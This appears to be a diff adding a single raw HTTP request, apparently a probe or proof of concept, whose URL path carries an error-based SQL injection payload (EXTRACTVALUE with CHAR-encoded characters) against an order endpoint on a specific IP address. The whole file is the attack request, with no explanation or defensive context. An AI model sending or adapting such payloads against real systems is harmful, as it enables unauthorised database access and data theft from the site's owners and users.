@@ -1,0 +1,5 @@
+GET /jifen/order/EXTRACTVALUE(1,%20CONCAT(0x3a,CHAR(52),CHAR(67),CHAR(117),CHAR(119),CHAR(97),CHAR(113),CHAR(111),CHAR(112),CHAR(115),CHAR(112),CHAR(103))) HTTP/1.1
+Host: 8.136.14.165
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+
